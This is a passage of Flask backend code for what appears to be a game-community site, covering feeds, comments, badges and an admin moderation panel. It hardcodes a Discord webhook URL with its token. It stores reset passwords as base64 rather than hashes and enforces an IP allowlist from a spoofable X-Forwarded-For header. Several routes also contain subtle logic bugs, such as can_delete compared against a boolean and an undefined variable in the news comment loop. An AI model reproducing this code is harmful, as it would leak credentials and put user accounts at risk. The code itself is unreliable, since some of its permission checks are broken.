          "group_name": "gold_purchase",
          "group_priority": 7,
          "reward_id": None,
          "seen": False,
          "owns": False if user.gold < 54000 else True,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/7d/12/7d12d494-d941-4f50-870e-f30e96be7ee7_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/7d/12/7d12d494-d941-4f50-870e-f30e96be7ee7_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/7d/12/7d12d494-d941-4f50-870e-f30e96be7ee7_64x64.jpg"
          }
        },
        {
          "id": 90,
          "name": "Mountain of Gold",
          "created": "2019-01-16T12:13:08+00:00",
          "updated": "2020-01-12T22:41:21+00:00",
          "language": "en_US",
          "image_small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/56/96567df0-4af8-469e-b283-28a5818f1a1e_16x16.jpg",
          "image_medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/56/96567df0-4af8-469e-b283-28a5818f1a1e_32x32.jpg",
          "image_large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/56/96567df0-4af8-469e-b283-28a5818f1a1e_64x64.jpg",
          "group_name": "gold_purchase",
          "group_priority": 8,
          "reward_id": None,
          "seen": False,
          "owns": False if user.gold < 120000 else True,
          "images": {
            "small": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/56/96567df0-4af8-469e-b283-28a5818f1a1e_16x16.jpg",
            "medium": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/56/96567df0-4af8-469e-b283-28a5818f1a1e_32x32.jpg",
            "large": "https://web.archive.org/web/20240424144834/https://www.kogstatic.com/gen_cache/96/56/96567df0-4af8-469e-b283-28a5818f1a1e_64x64.jpg"
          }
        }
    ]}
    return jsonify(badge_data), 200

@app.route('/user/<int:user_id>/avatar/', methods=['GET'])
def access_user_avatars(user_id):
    user = db.session.get(User, user_id)
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 12))
        if count < 1: count = 1
        if count > 50:
            count = 50
        base_query = db.session.query(Avatar).filter(Avatar.user_id == user_id)
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        avatars = base_query.order_by(Avatar.id.desc()).offset(offset_value).limit(count).all()
        avatars_data = [avatar.to_dict() for avatar in avatars]
        for avatar_data in avatars_data:
            avatar_data["is_active"] = avatar_data["avatar_id"] == user.avatar_id
        for avatar in avatars:
            avatar.is_active = avatar_data["avatar_id"] == user.avatar_id
        db.session.commit()
        prev_url = f"/user/{user_id}/avatar/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/user/{user_id}/avatar/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/user/{user_id}/avatar/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": avatars_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200

@app.route('/api/feed/<int:user_id>/', methods=['GET', 'POST'])
def user_api_feed(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 12))
        if count < 1: count = 1
        if count > 50:
            count = 50
        base_query = db.session.query(FeedPost).filter(FeedPost.other_profile_id == user_id, FeedPost.deleted == None)
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        posts = base_query.order_by(FeedPost.id.desc()).offset(offset_value).limit(count).all()
        posts_data = [post.to_dict() for post in posts]
        for post_data in posts_data:
            comments_count = db.session.query(FeedComment).filter(and_(FeedComment.object_id == post_data["id"], or_(FeedComment.object_type == "wall_post", FeedComment.object_type == "status_updated"))).count()
            post_data["can_delete"] = current_user.is_authenticated and (user_id == current_user.id or post_data["profile_id"] == current_user.id)
            def _fill_avatar_slot(target_user_id, slot_dict, fallback_user):
                av = db.session.query(Avatar).filter(and_(Avatar.user_id == target_user_id, Avatar.is_active == True)).first()
                src = None
                if av and av.images:
                    try:
                        src = json.loads(av.images)
                    except Exception:
                        src = None
                if not src:
                    src = fallback_user.AVATAR_IMAGES_MAP.get(fallback_user.avatar_id, {})
                for k in ("micro", "small", "medium", "large"):
                    if src.get(k):
                        slot_dict[k] = src[k]

            if current_user.is_authenticated:
                _fill_avatar_slot(current_user.id, post_data["avatar_images"], current_user)
            _fill_avatar_slot(user.id, post_data["profile_images"], user)
            if comments_count > 0:
                post_data["comments"] = comments_count
        for post in posts:
            post.can_delete = current_user.is_authenticated and (user_id == current_user.id or post.profile_id == current_user.id)
        db.session.commit()
        prev_url = f"/api/feed/{user_id}/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/api/feed/{user_id}/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/api/feed/{user_id}/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": posts_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200
    if not current_user.is_authenticated or not db.session.query(Friend).filter(or_(and_(Friend.profile_id == current_user.id, Friend.friend_profile_id == user.id, Friend.friend_status == "accepted"), and_(Friend.profile_id == user.id, Friend.friend_profile_id == current_user.id, Friend.friend_status == "accepted"))).first() and current_user.id != user.id:
        abort(401)
    data = request.get_json(silent=True) or {}
    status_message = str(data.get('status_message', '')).strip()
    if not status_message:
        return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
    data_to_dump = {"status_message": status_message}
    if status_message.startswith('https://www.youtube.com/watch?v=') or status_message.startswith('youtube.com/watch?v='):
        data_to_dump["youtube_id"] = status_message.split('youtube.com/watch?v=')[1].split('&')[0]
    new_post = FeedPost(
        feed_type="status_updated" if user_id == current_user.id else "wall_post",
        _data=json.dumps(data_to_dump),
        profile_id=current_user.id,
        deleted=None,
        planet_id=None,
        item_id=None,
        news_id=None,
        avatar_id=current_user.avatar_id,
        other_profile_id=user_id,
        gold=0,
        profile_username=current_user.username,
        profile_images=json.dumps(current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {})),
        active_avatar_id=current_user.avatar_id,
        planet_name="",
        planet_images=None,
        item_images=None,
        avatar_images=json.dumps(user.AVATAR_IMAGES_MAP.get(user.avatar_id, {})),
        other_username=user.username,
        badge_id=0,
        badge_name="",
        badge_images=json.dumps({
            "large": "https://web.archive.org/web/20251117195523/https://www.kogstatic.com/placeholder/broken_badge_large_64x64.jpg"
        }),
        is_subscriber=False,
        can_delete=False
    )
    last_post = db.session.query(FeedPost).filter(FeedPost.other_profile_id == new_post.other_profile_id).order_by(FeedPost.id.desc()).first()
    if last_post and last_post.created:
        now = datetime.now(timezone.utc)
        last_post_time = last_post.created.replace(tzinfo=timezone.utc) if last_post.created.tzinfo is None else last_post.created
        if now - last_post_time < timedelta(minutes=5) and last_post.profile_id == current_user.id:
            return jsonify({"data": [new_post.to_dict()]}), 201
    db.session.add(new_post)
    db.session.commit()
    return jsonify({"data": [new_post.to_dict()]}), 201

@app.route('/api/feed/<int:user_id>/<int:feed_id>/', methods=['GET', 'DELETE'])
def user_view_feed(user_id, feed_id):
    post_data = db.session.get(FeedPost, feed_id)
    if not post_data or post_data.deleted is not None:
        abort(404)
    if request.method == 'GET':
        return jsonify(post_data.to_dict()), 200
    elif request.method == 'DELETE':
        if not post_data.can_delete:
            abort(401)
        post_data.deleted = datetime.now(timezone.utc)
        db.session.commit()
        return jsonify({"__all__": ["News feed deleted successfully"]}), 204

@app.route('/api/feed/<int:feed_id>/comment/', methods=['GET', 'POST'])
def user_feed_comments(feed_id):
    post = db.session.get(FeedPost, feed_id)
    if not post:
        abort(404)
    user = db.session.get(User, post.profile_id)
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 5))
        if count < 5: count = 5
        if count > 50:
            count = 50
        base_query = db.session.query(FeedComment).filter(and_(FeedComment.object_id == feed_id, or_(FeedComment.object_type == "wall_post", FeedComment.object_type == "status_updated")))
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        comments = base_query.order_by(FeedComment.id.desc()).offset(offset_value).limit(count).all()
        comments_data = [comment.to_dict() for comment in comments]
        for comment_data in comments_data:
            user = db.session.get(User, comment_data["profile_id"])
            comment_data["can_delete"] = comment_data["profile_id"] == current_user.is_authenticated and (comment_data["profile_id"] == user.id or post.other_profile_id == post.profile_id)
            active_avatar = db.session.query(Avatar).filter(and_(Avatar.user_id == user.id, Avatar.is_active == True)).first()
            if active_avatar and active_avatar.images:
                _av = json.loads(active_avatar.images)
                comment_data["images"]["micro"] = _av.get('micro')
                comment_data["images"]["small"] = _av.get('small')
                comment_data["images"]["medium"] = _av.get('medium')
                comment_data["images"]["large"] = _av.get('large')
        for comment in comments:
            comment.can_delete = current_user.is_authenticated and (comment.profile_id == user.id or post.other_profile_id == post.profile_id)
        db.session.commit()
        prev_url = f"/api/feed/{feed_id}/comment/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/api/feed/{feed_id}/comment/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/api/feed/{feed_id}/comment/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": comments_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200
    @limiter.limit("10 per 1 minute; 50 per 10 minutes")
    def handle_post():
        data = request.get_json(silent=True) or {}
        comment = str(data.get('comment', '')).strip()
        if not comment:
                return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
        serialized_data = json.dumps({"data": comment})
        new_comment = FeedComment(
            profile_id=current_user.id,
            _data = serialized_data,
            object_id=feed_id,
            object_type="status_updated" if feed_id == current_user.id else "wall_post",
            profile_username=current_user.username,
            images=json.dumps(current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {})),
            avatar_id=current_user.avatar_id,
            is_subscriber=False,
            can_delete=False
        )
        db.session.add(new_comment)
        db.session.commit()
        request_payload = {
            "data": [new_comment.to_dict()]
        }
        return jsonify(request_payload), 201
    return handle_post()

@app.route('/api/feed/<int:feed_id>/comment/<int:comment_id>/', methods=['GET', 'DELETE'])
def user_view_comment(feed_id, comment_id):
    comment_data = db.session.get(FeedComment, comment_id)
    if not comment_data:
        abort(404)
    if request.method == 'GET':
        return jsonify(comment_data.to_dict()), 200
    elif request.method == 'DELETE':
        if not comment_data.can_delete:
            abort(401)
        db.session.delete(comment_data)
        db.session.commit()
        return jsonify({"__all__": ["Comment Deleted"]}), 204

@app.route('/api/emote/<int:user_id>/')
def user_emote_api(user_id):
    return {}, 200

@app.route('/api/news/', methods=['GET', 'POST'])
@cache_anon(60)
def news_feed_api():
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 12))
        if count < 12: count = 12
        if count > 50:
            count = 50
        now = datetime.now(timezone.utc)
        base_query = db.session.query(NewsFeed).filter(
            NewsFeed.is_archived == False,
            NewsFeed.is_published == True,
            db.or_(NewsFeed.scheduled_publish_at == None, NewsFeed.scheduled_publish_at <= now)
        )
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        news_feeds = base_query.order_by(NewsFeed.is_pinned.desc(), NewsFeed.published.desc()).offset(offset_value).limit(count).all()
        news_feeds_datas = [news_feed.to_dict() for news_feed in news_feeds]
        prev_url = f"/api/news/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/api/news/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/api/news/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": news_feeds_datas,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200

@app.route('/api/news/<int:news_id>/')
def get_news_feed(news_id):
    news_feed = db.session.get(NewsFeed, news_id)
    if not news_feed:
        abort(404)
    return jsonify(news_feed.to_dict()), 200

@app.route('/api/news/<int:news_id>/comment/', methods=['GET', 'POST'])
def get_news_feed_comments(news_id):
    news_feed = db.session.get(NewsFeed, news_id)
    if not news_feed:
        abort(404)
    user = db.session.get(User, news_feed.profile_id)
    if request.method == 'GET':
        page = int(request.args.get('page', 1))
        if page < 1: page = 1
        count = int(request.args.get('count', 5))
        if count < 5: count = 5
        if count > 50:
            count = 50
        base_query = db.session.query(FeedComment).filter(FeedComment.object_id == news_id, FeedComment.object_type == "news")
        total_records = base_query.count()
        total_pages = math.ceil(total_records / count) if total_records > 0 else 1
        if page > total_pages:
            page = total_pages
        offset_value = (page - 1) * count
        comments = base_query.order_by(FeedComment.id.desc()).offset(offset_value).limit(count).all()
        comments_data = [comment.to_dict() for comment in comments]
        for comment_data in comments_data:
            user = db.session.get(User, comment_data["profile_id"])
            comment_data["can_delete"] = comment_data["profile_id"] == current_user.is_authenticated and (comment.profile_id == user.id)
            active_avatar = db.session.query(Avatar).filter(and_(Avatar.user_id == user.id, Avatar.is_active == True)).first()
            if active_avatar and active_avatar.images:
                _av = json.loads(active_avatar.images)
                comment_data["images"]["micro"] = _av.get('micro')
                comment_data["images"]["small"] = _av.get('small')
                comment_data["images"]["medium"] = _av.get('medium')
                comment_data["images"]["large"] = _av.get('large')
        for comment in comments:
            comment.can_delete = current_user.is_authenticated and (comment.profile_id == user.id)
        db.session.commit()
        prev_url = f"/api/news/{news_id}/comment/?page={page - 1}&count={count}" if page > 1 else ""
        next_url = f"/api/news/{news_id}/comment/?page={page + 1}&count={count}" if page < total_pages else ""
        paging_links = []
        paging_links.append({
            "url": f"/api/news/{news_id}/comment/?page={page}&count={count}",
            "title": page,
            "is_link": True,
            "is_current": True
        })
        response_payload = {
            "data": comments_data,
            "paging": {
                "count": count,
                "total": total_records,
                "prev_url": prev_url,
                "next_url": next_url,
                "page": page,
                "pages": total_pages,
                "paging_links": paging_links
            }
        }
        return jsonify(response_payload), 200
    @limiter.limit("10 per 1 minute; 50 per 10 minutes")
    def handle_post():
        data = request.get_json(silent=True) or {}
        comment = str(data.get('comment', '')).strip()
        if not comment:
                return jsonify({'error': {'__all__': ['400 Bad Request']}}), 400
        serialized_data = json.dumps({"data": comment})
        new_comment = FeedComment(
            profile_id=current_user.id,
            _data = serialized_data,
            object_id=news_id,
            object_type="news",
            profile_username=current_user.username,
            images=json.dumps(current_user.AVATAR_IMAGES_MAP.get(current_user.avatar_id, {})),
            avatar_id=current_user.avatar_id,
            is_subscriber=False,
            can_delete=False
        )
        db.session.add(new_comment)
        db.session.commit()
        request_payload = {
            "data": [new_comment.to_dict()]
        }
        return jsonify(request_payload), 201
    return handle_post()

@app.route('/api/news/<int:news_id>/comment/<int:comment_id>/', methods=['GET', 'DELETE'])
def user_view_news_comment(news_id, comment_id):
    comment_data = db.session.get(FeedComment, comment_id)
    if not comment_data:
        abort(404)
    if request.method == 'GET':
        return jsonify(comment_data.to_dict()), 200
    elif request.method == 'DELETE':
        if not comment_data.can_delete:
            abort(401)
        db.session.delete(comment_data)
        db.session.commit()
        return jsonify({"__all__": ["Comment Deleted"]}), 204

# ==================================================
#  ADMIN PANEL
# ==================================================
from functools import wraps

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role not in ('owner', 'admin', 'mod', 'staff'):
            abort(403)
        enforce_ip_allowlist()
        return f(*args, **kwargs)
    return decorated


def owner_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.is_authenticated or current_user.role != 'owner':
            abort(403)
        enforce_ip_allowlist()
        return f(*args, **kwargs)
    return decorated


def enforce_ip_allowlist():
    if not current_user.is_authenticated:
        return
    allow = (current_user.ip_allowlist or '').strip()
    if not allow:
        return
    allowed = {a.strip() for a in allow.split(',') if a.strip()}
    ip = client_ip()
    if ip and ip not in allowed:
        abort(403)


def log_audit(action, target_type=None, target_id=None, details=None):
    try:
        actor_id = current_user.id if current_user.is_authenticated else None
        actor_username = current_user.username if current_user.is_authenticated else None
        db.session.add(AuditLog(actor_id=actor_id, actor_username=actor_username,
                                action=action, target_type=target_type, target_id=target_id,
                                details=details))
        db.session.commit()
    except Exception:
        db.session.rollback()


def log_gold(user, amount, reason=None, admin_id=None):
    try:
        db.session.add(GoldTransaction(user_id=user.id, user_username=user.username,
                                       amount=amount, balance_after=user.gold,
                                       reason=reason, admin_id=admin_id))
        db.session.commit()
    except Exception:
        db.session.rollback()


def log_xp(user, amount, level_before, level_after, reason=None, admin_id=None):
    try:
        db.session.add(XpLog(user_id=user.id, user_username=user.username,
                             amount=amount, level_before=level_before, level_after=level_after,
                             reason=reason, admin_id=admin_id))
        db.session.commit()
    except Exception:
        db.session.rollback()


def client_ip():
    return request.headers.get('X-Forwarded-For', request.remote_addr or '').split(',')[0].strip() or None


@app.route('/admin/')
def admin_panel():
    if not current_user.is_authenticated or current_user.role not in ('owner', 'admin', 'mod', 'staff'):
        return redirect('/')
    return render_template('admin.html', username=current_user.username, role=current_user.role)

@app.route('/api/admin/stats/')
@admin_required
def admin_stats():
    total_users = User.query.count()
    from datetime import timedelta
    now = datetime.now(timezone.utc)
    hour_ago = now - timedelta(hours=1)
    day_ago = now - timedelta(days=1)
    signups_hour = User.query.filter(User.created >= hour_ago).count()
    signups_day = User.query.filter(User.created >= day_ago).count()
    online_count = User.query.filter(User.last_ping >= now - timedelta(minutes=5)).count()
    in_game_count = User.query.filter(User.last_ping >= now - timedelta(minutes=2), User.location.isnot(None)).count()
    return jsonify({
        "total_users": total_users,
        "signups_hour": signups_hour,
        "signups_day": signups_day,
        "online": online_count,
        "in_game": in_game_count
    })

# ==================================================
#  PHASE 1: Dashboard, Reports, Security, Moderation
# ==================================================

@app.route('/api/admin/dashboard/')
@admin_required
def admin_dashboard():
    from datetime import timedelta
    now = datetime.now(timezone.utc)
    total_users = User.query.count()
    online_count = User.query.filter(User.last_ping >= now - timedelta(minutes=5)).count()
    banned_count = User.query.filter(User.is_banned == True).count()
    new_today = User.query.filter(User.created >= now - timedelta(days=1)).count()
    open_reports = Report.query.filter(Report.status == 'pending').count()
    try:
        db.session.execute(text('SELECT 1'))
        db_status = 'ok'
    except Exception:
        db_status = 'error'
    uptime_seconds = int((now.replace(tzinfo=None) - START_TIME.replace(tzinfo=None)).total_seconds())
    recent_activity = []
    try:
        for a in AuditLog.query.order_by(AuditLog.id.desc()).limit(10).all():
            recent_activity.append(a.to_dict())
    except Exception:
        pass
    recent_reports = [r.to_dict() for r in Report.query.order_by(Report.id.desc()).limit(5).all()]
    return jsonify({
        "total_users": total_users,
        "online": online_count,
        "banned": banned_count,
        "new_today": new_today,
        "signups_day": new_today,
        "open_reports": open_reports,
        "server_status": "ok",
        "db_status": db_status,
        "uptime_seconds": uptime_seconds,
        "start_time": START_TIME.isoformat(),
        "recent_activity": recent_activity,
        "recent_reports": recent_reports
    })


@app.route('/api/reports/', methods=['POST'])
def api_report():
    data = request.get_json(silent=True) or {}
    reporter_id = current_user.id if current_user.is_authenticated else None
    reporter_username = current_user.username if current_user.is_authenticated else None
    rep = Report(
        reporter_id=reporter_id,
        reporter_username=reporter_username,
        reported_username=data.get('reported_username'),
        report_type=data.get('category') or data.get('report_type') or 'other',
        reason=data.get('reason'),
        details=data.get('details'),
        evidence_url=data.get('evidence_url'),
        status='pending'
    )
    db.session.add(rep)
    db.session.commit()
    try:
        webhook_url = "https://discord.com/api/webhooks/1392821308592877648/90j75gDrGI2mtQIdfBnlWl8YcyzOipIINe7EFvT3r1nQZwMTlzpE8DxZw5qNU3m1VlDr"
        requests.post(webhook_url, json={
            "content": f"🚨 New Report #{rep.id}\nReporter: {reporter_username}\nReported: {rep.reported_username}\nCategory: {rep.report_type}\nReason: {rep.reason}\nDetails: {rep.details}"
        }, timeout=5)
    except Exception:
        pass
    return jsonify({"message": "Report submitted", "report_id": rep.id}), 200


@app.route('/api/admin/reports/')
@admin_required
def admin_list_reports():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 20, type=int)
    status = request.args.get('status', 'all')
    search = request.args.get('search', '').strip()
    query = Report.query
    if status != 'all':
        query = query.filter(Report.status == status)
    if search:
        query = query.filter(or_(Report.reported_username.ilike(f'%{search}%'),
                                 Report.reporter_username.ilike(f'%{search}%'),
                                 Report.details.ilike(f'%{search}%')))
    query = query.order_by(Report.id.desc())
    total = query.count()
    reports = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [r.to_dict() for r in reports],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })


@app.route('/api/admin/reports/<int:report_id>/', methods=['GET', 'POST'])
@admin_required
def admin_report_detail(report_id):
    rep = db.session.get(Report, report_id)
    if not rep:
        abort(404)
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        action = data.get('action')
        if action == 'status':
            rep.status = data.get('status', rep.status)
        elif action == 'note':
            rep.admin_note = data.get('note', rep.admin_note)
            if data.get('contact_reporter'):
                rep.contact_reporter = True
        elif action == 'archive':
            rep.status = 'archived'
        elif action == 'ban':
            target = db.session.query(User).filter(func.lower(User.username) == func.lower(rep.reported_username or '')).first()
            if target:
                target.is_banned = True
                target.ban_reason = f'Report #{rep.id}: {rep.reason}'
                db.session.add(ModerationAction(user_id=target.id, user_username=target.username,
                                                 actor_id=current_user.id, actor_username=current_user.username,
                                                 action_type='ban', reason=f'Via report #{rep.id}'))
                rep.status = 'accepted'
        db.session.commit()
        log_audit('report_action', 'report', rep.id, f'action={action}')
        return jsonify(rep.to_dict()), 200
    return jsonify(rep.to_dict()), 200


@app.route('/api/admin/audit/')
@admin_required
def admin_audit():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 30, type=int)
    action = request.args.get('action', '').strip()
    query = AuditLog.query
    if action:
        query = query.filter(AuditLog.action == action)
    query = query.order_by(AuditLog.id.desc())
    total = query.count()
    logs = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [l.to_dict() for l in logs],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })


@app.route('/api/admin/permission-groups/', methods=['GET', 'POST'])
@admin_required
def admin_permission_groups():
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        grp = StaffPermissionGroup(name=data.get('name'), permissions=data.get('permissions'))
        db.session.add(grp)
        db.session.commit()
        log_audit('perm_group_create', 'perm_group', grp.id, grp.name)
        return jsonify(grp.to_dict()), 200
    groups = StaffPermissionGroup.query.all()
    return jsonify([g.to_dict() for g in groups]), 200


@app.route('/api/admin/permission-groups/<int:group_id>/', methods=['PUT', 'DELETE'])
@admin_required
def admin_permission_group_detail(group_id):
    grp = db.session.get(StaffPermissionGroup, group_id)
    if not grp:
        abort(404)
    if request.method == 'DELETE':
        db.session.delete(grp)
        db.session.commit()
        log_audit('perm_group_delete', 'perm_group', grp.id, grp.name)
        return jsonify({"message": "deleted"}), 200
    data = request.get_json(silent=True) or {}
    grp.name = data.get('name', grp.name)
    grp.permissions = data.get('permissions', grp.permissions)
    db.session.commit()
    return jsonify(grp.to_dict()), 200


@app.route('/api/admin/sessions/')
@admin_required
def admin_sessions():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 30, type=int)
    query = LoginHistory.query.order_by(LoginHistory.id.desc())
    total = query.count()
    logs = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [l.to_dict() for l in logs],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })


@app.route('/api/admin/users/<int:user_id>/security/')
@admin_required
def admin_user_security(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    logins = [l.to_dict() for l in LoginHistory.query.filter_by(user_id=user.id).order_by(LoginHistory.id.desc()).limit(10).all()]
    return jsonify({
        "user_id": user.id,
        "username": user.username,
        "two_factor_enabled": user.two_factor_enabled,
        "ip_allowlist": user.ip_allowlist or "",
        "locked": user.locked,
        "suspended": user.suspended,
        "shadow_banned": user.shadow_banned,
        "muted_until": user.muted_until.isoformat() if user.muted_until else None,
        "last_login": user.last_login.isoformat() if user.last_login else None,
        "login_ip": user.login_ip,
        "session_version": user.session_version,
        "recent_logins": logins
    })


@app.route('/api/admin/users/<int:user_id>/security/', methods=['PUT'])
@admin_required
def admin_user_security_update(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    data = request.get_json(silent=True) or {}
    if 'two_factor_enabled' in data:
        user.two_factor_enabled = bool(data['two_factor_enabled'])
    if 'ip_allowlist' in data:
        user.ip_allowlist = data['ip_allowlist']
    if 'locked' in data:
        user.locked = bool(data['locked'])
    if 'suspended' in data:
        user.suspended = bool(data['suspended'])
    if 'shadow_banned' in data:
        user.shadow_banned = bool(data['shadow_banned'])
    if 'muted_until' in data:
        user.muted_until = datetime.fromisoformat(data['muted_until']) if data['muted_until'] else None
    if 'display_name' in data:
        user.display_name = data['display_name']
    db.session.commit()
    log_audit('security_update', 'user', user.id, str(data))
    return jsonify({"message": "updated"}), 200


@app.route('/api/admin/moderation/')
@admin_required
def admin_moderation_list():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 30, type=int)
    query = ModerationAction.query
    uid = request.args.get('user_id', type=int)
    if uid:
        query = query.filter(ModerationAction.user_id == uid)
    query = query.order_by(ModerationAction.id.desc())
    total = query.count()
    actions = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [a.to_dict() for a in actions],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })


@app.route('/api/admin/users/<int:user_id>/moderate/', methods=['POST'])
@admin_required
def admin_user_moderate(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    data = request.get_json(silent=True) or {}
    action = data.get('action')
    note = data.get('reason') or data.get('note') or ''
    if action == 'ban':
        duration = data.get('duration_days')
        if duration:
            user.ban_expires = datetime.now(timezone.utc) + timedelta(days=int(duration))
        user.is_banned = True
        user.ban_reason = note
    elif action == 'unban':
        user.is_banned = False
        user.ban_expires = None
        user.ban_reason = None
    elif action == 'mute':
        user.muted_until = datetime.now(timezone.utc) + timedelta(hours=int(data.get('hours', 24)))
    elif action == 'unmute':
        user.muted_until = None
    elif action == 'warn':
        user.warned_count = (user.warned_count or 0) + 1
    elif action == 'remove_warning':
        user.warned_count = max(0, (user.warned_count or 0) - 1)
    elif action == 'shadow_ban':
        user.shadow_banned = True
    elif action == 'shadow_unban':
        user.shadow_banned = False
    elif action == 'lock':
        user.locked = True
    elif action == 'unlock':
        user.locked = False
    elif action == 'suspend':
        user.suspended = True
    elif action == 'unsuspend':
        user.suspended = False
    elif action == 'reset_password':
        user.password = base64.b64encode(str(data.get('new_password', 'changeme123')).encode()).decode()
    elif action == 'force_logout':
        user.session_version += 1
    else:
        return jsonify({"error": "Unknown action"}), 400
    db.session.commit()
    db.session.add(ModerationAction(user_id=user.id, user_username=user.username,
                                     actor_id=current_user.id, actor_username=current_user.username,
                                     action_type=action, reason=note))
    db.session.commit()
    log_audit('moderate', 'user', user.id, f'action={action}, note={note}')
    return jsonify(user.to_dict()), 200


@app.route('/api/admin/users/<int:user_id>/notes/', methods=['GET', 'POST'])
@admin_required
def admin_user_notes(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    raw = user.admin_notes or ''
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
        note = data.get('note', '').strip()
        ts = datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M')
        entry = f'[{ts}] {current_user.username}: {note}'
        raw = (raw + '\n' + entry).strip() if raw else entry
        user.admin_notes = raw
        db.session.commit()
        log_audit('mod_note', 'user', user.id, note)
        return jsonify({"notes": raw}), 200
    return jsonify({"notes": raw}), 200


@app.route('/api/admin/users/')
@admin_required
def admin_list_users():
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 20, type=int)
    sort = request.args.get('sort', 'ASC')
    sort_col = request.args.get('sort_column', 'id')
    search = request.args.get('search', '').strip()
    query = User.query
    if search:
        query = query.filter(User.username.ilike(f'%{search}%'))
    col = getattr(User, sort_col, User.id)
    if sort.upper() == 'DESC':
        query = query.order_by(col.desc())
    else:
        query = query.order_by(col.asc())
    total = query.count()
    users = query.offset((page - 1) * limit).limit(limit).all()
    return jsonify({
        "data": [u.to_dict() for u in users],
        "total": total,
        "page": page,
        "pages": math.ceil(total / limit) if limit else 1
    })

@app.route('/api/admin/user/<int:user_id>/role/', methods=['PUT'])
@admin_required
def admin_set_role(user_id):
    user = db.session.get(User, user_id)
    if not user:
        abort(404)
    data = request.get_json() or {}
    new_role = data.get('role', 'user')
    if new_role not in ('admin', 'mod', 'staff', 'user'):
        return jsonify({"error": "Invalid role"}), 400
